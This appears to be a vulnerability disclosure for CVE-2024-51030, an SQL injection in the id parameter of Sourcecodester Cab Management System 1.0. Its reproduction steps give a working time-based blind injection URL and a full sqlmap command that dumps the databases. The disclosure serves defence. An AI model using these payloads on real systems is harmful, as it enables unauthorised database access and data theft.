# CVE-2024-51030

### Description
A SQL injection vulnerability in manage_client.php and view_cab.php of Sourcecodester Cab Management System 1.0 allows remote attackers to execute arbitrary SQL commands via the id parameter, leading to unauthorized access and potential compromise of sensitive data within the database.

### Vulnerability Type
SQL Injection

### Vendor of Product
Sourcecodester

### Affected Product Code Base: 
https://www.sourcecodester.com/php/15180/cab-management-system-phpoop-free-source-code.html - 1.0

### Affected Component: 
The Sourcecodester Cab Management System v1.0  is vulnerable to SQL injection through the id parameter in the manage_client.php & view_cab.php page.

### Attack Vectors:
1) Set up the application locally and login using the default provided admin credentials or you may also login using low privileged admin user like (staff).
2) Now, navigate to the following URL in your browser: http://localhost/cms/admin/?page=clients/manage_client&id=1
3) Inject SQL Payload: Modify the id parameter in the URL to include a boolean-based blind or time-based blind SQL injection payload:- http://localhost/cms/admin/?page=clients/manage_client&id=1%27%20AND%20(SELECT%202085%20FROM%20(SELECT(SLEEP(5)))LxyK)--%20mvKJ
4) Observe the Application Response: The page should take noticeably longer (5 seconds) to load if the injection is successful, confirming that the id parameter is vulnerable to SQL injection.
5) Now use SQLMap tool for further exploitation and dumping databases using the below command: sqlmap -u "http://localhost/cms/admin/?page=clients/manage_client&id=1"  -p id --dbms mysql --cookie="PHPSESSID=your_cookie" --risk 3 --level 4 --dbs  --dump

### Reference: 
1) https://owasp.org/www-community/attacks/SQL_Injection
2) https://portswigger.net/web-security/sql-injection
